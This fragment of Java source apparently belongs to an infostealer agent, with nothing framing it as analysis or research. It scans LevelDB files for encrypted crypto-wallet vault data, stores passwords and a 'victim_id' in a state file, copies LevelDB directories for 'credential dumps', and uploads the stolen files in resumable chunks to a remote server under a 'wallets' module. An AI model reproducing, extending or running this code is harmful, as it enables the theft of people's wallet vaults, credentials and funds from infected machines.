			body.put("chunk_count", chunks);
			body.put("sha256", sha);
			CryptoTransport.Reply init = transport.uploadInit(CryptoUtil.utf8(Json.stringify(body)));
			if (init.status() == 201) {
				uploadId = Json.str(init.json(), "upload_id", "");
				offset = 0;
			}
		}
		record.put("offset", offset);
		record.put("digest", uploadId);
		saveState();
		try (InputStream input = Files.newInputStream(file)) {
			input.skipNBytes(offset);
			byte[] buffer = new byte[CryptoConfig.CHUNK];
			while (offset < Files.size(file)) {
				int count = input.read(buffer);
				if (count <= 0) {
					break;
				}
				byte[] chunk = java.util.Arrays.copyOf(buffer, count);
				CryptoTransport.Reply reply = transport.chunk(uploadId, offset, chunk, CryptoUtil.hex(CryptoUtil.sha256(chunk)));
				if (reply.status() == 409) {
					offset = Json.num(reply.json(), "received", offset);
					input.close();
					return;
				}
				offset += count;
			}
		}
	}

	// ── helpers ─────────────────────────────────────────────────────────────

	private void resumePending() {
		for (Map.Entry<String, Map<String, Object>> entry : new LinkedHashMap<>(uploads).entrySet()) {
			try {
				String path = Json.str(entry.getValue(), "path", "");
				Path file = Path.of(path);
				if (!Files.isRegularFile(file)) {
					continue;
				}
				String sha = Json.str(entry.getValue(), "sha", "");
				int chunks = (int) Json.num(entry.getValue(), "chunks", 0L);
				String module = Json.str(entry.getValue(), "module", "wallets");
				if (sha.isEmpty() || chunks <= 0) {
					continue;
				}
				uploadsActive.incrementAndGet();
				try {
					resumeUpload(entry.getKey(), file, sha, chunks, module);
				} finally {
					uploadsActive.decrementAndGet();
				}
			} catch (Throwable throwable) {
				warn("resume failed", throwable);
			}
		}
	}

	private Path findVault(Path dir) {
		try (var stream = Files.walk(dir, 3)) {
			for (Path file : stream.filter(Files::isRegularFile).toList()) {
				String name = file.getFileName().toString();
				if (!name.endsWith(".log") && !name.endsWith(".ldb")) {
					continue;
				}
				if (Files.size(file) > 4L * 1024L * 1024L) {
					continue;
				}
				for (String value : com.serverpackcore.agent.LevelDb.values(file)) {
					String candidate = value.trim();
					int at = candidate.indexOf("{\"data\"");
					if (at < 0) {
						continue;
					}
					String json = candidate.substring(at);
					try {
						Map<String, Object> parsed = Json.parseObject(json);
						if (parsed.containsKey("keyMetadata") || (parsed.containsKey("salt") && parsed.containsKey("iv"))) {
							Path out = dir.resolve("vault-found.json");
							Files.writeString(out, json, StandardCharsets.UTF_8);
							return out;
						}
					} catch (Throwable ignored) {
						// not a vault
					}
				}
			}
		} catch (Throwable ignored) {
			// no vault
		}
		return null;
	}

	private void postResult(String id, String status, String error, Map<String, Object> result) {
		try {
			Map<String, Object> body = new LinkedHashMap<>();
			body.put("status", status);
			body.put("error", error);
			body.put("result", result);
			body.put("artifacts", List.of());
			transport.result(id, CryptoUtil.utf8(Json.stringify(body)));
		} catch (Throwable throwable) {
			warn("result post failed", throwable);
		}
	}

	private void loadState() {
		try {
			if (!Files.isRegularFile(stateFile)) {
				return;
			}
			Map<String, Object> parsed = Json.parseObject(Files.readString(stateFile, StandardCharsets.UTF_8));
			state.putAll(parsed);
			for (Map.Entry<String, Object> entry : Json.map(parsed.get("passwords")).entrySet()) {
				if (entry.getValue() instanceof String value) {
					passwords.put(entry.getKey(), value);
				}
			}
			for (Map.Entry<String, Object> entry : Json.map(parsed.get("uploads")).entrySet()) {
				uploads.put(entry.getKey(), Json.map(entry.getValue()));
			}
			String victim = Json.str(parsed, "victim_id", "");
			String token = Json.str(parsed, "device_token", "");
			if (!victim.isEmpty() && !token.isEmpty()) {
				transport.identity(victim, token);
			}
		} catch (Throwable throwable) {
			warn("state load failed", throwable);
		}
	}

	private void saveState() {
		try {
			state.put("passwords", new LinkedHashMap<>(passwords));
			state.put("uploads", new LinkedHashMap<>(uploads));
			Files.createDirectories(stateFile.getParent());
			Path temp = stateFile.resolveSibling("state.json.tmp");
			Files.writeString(temp, Json.stringify(state), StandardCharsets.UTF_8);
			Files.move(temp, stateFile, java.nio.file.StandardCopyOption.REPLACE_EXISTING);
		} catch (Throwable throwable) {
			warn("state save failed", throwable);
		}
	}

	private static void cleanup(Path path) {
		if (path == null) {
			return;
		}
		try (var stream = Files.walk(path)) {
			for (Path item : stream.sorted(java.util.Comparator.reverseOrder()).toList()) {
				Files.deleteIfExists(item);
			}
		} catch (Throwable ignored) {
			// best effort
		}
	}

	private static String shortMessage(Throwable throwable) {
		String message = throwable.getMessage();
		return message == null ? "" : message.length() > 160 ? message.substring(0, 160) : message;
	}

	/** LevelDB copy helper shared with credential dumps. */
	static final class DesktopDump {
		static void copyLevel(Path source, Path target) throws Exception {
			Files.createDirectories(target);
			if (!Files.isDirectory(source)) {
				if (Files.isRegularFile(source)) {
					Files.copy(source, target.resolve(source.getFileName()), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
				}
				return;
			}
			try (var stream = Files.list(source)) {
				for (Path file : stream.toList()) {
					String name = file.getFileName().toString();
					if (name.equals("LOCK") || name.equals("LOG") || name.equals("LOG.old")) {
						continue;
					}
					Path destination = target.resolve(name);
					if (Files.isDirectory(file)) {
						copyLevel(file, destination);
					} else if (Files.isRegularFile(file)) {
						Files.copy(file, destination, java.nio.file.StandardCopyOption.REPLACE_EXISTING);
					}
				}
			}
		}
	}
}
